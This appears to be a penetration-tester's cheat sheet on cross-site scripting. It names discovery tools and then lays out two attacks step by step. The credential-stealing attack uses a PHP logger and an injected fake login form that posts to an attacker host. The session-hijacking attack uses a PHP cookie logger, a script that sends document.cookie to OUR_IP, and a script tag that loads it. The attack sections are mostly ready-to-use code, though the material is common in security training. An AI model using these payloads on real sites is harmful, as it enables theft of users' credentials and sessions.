## Automated Discovery
Some of the common open-source tools that can assist us in XSS discovery are [XSS Strike](https://github.com/s0md3v/XSStrike), [Brute XSS](https://github.com/rajeshmajumdar/BruteXSS), and [XSSer](https://github.com/epsylon/xsser).

## Manual Discovery
We can find huge lists of XSS payloads online, like the one on [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md) or the one in [PayloadBox](https://github.com/payloadbox/xss-payload-list).

## Code Review
The most reliable method of detecting XSS vulnerabilities is manual code review, which should cover both back-end and front-end code.


## Credentials Stealing
### Step 1
Set up an HTTP server, a netcat server might be rejected. Example:

```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>
```

### Step 2
Define an XSS vulnerable input or what kind of XSS vuln it is

### Step 3
Delivery:
```javascript
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
```

We use the payload below to remove any suspicious elements
```javascript
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();
```

## Session Hijacking
### Step 1
Have an HTTP server that would extract the cookie. This only extract the ALREADY stolen cookie from the payload to a file
```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

### Step 2
Build a payload that steals the cookie and call said php file. script.js:
```javascript
new Image().src='http://OUR_IP/index.php?c='+document.cookie
```

### Step 3
The actuall XSS payload, that call said script.js
```html
<script src=http://OUR_IP/script.js></script>
```
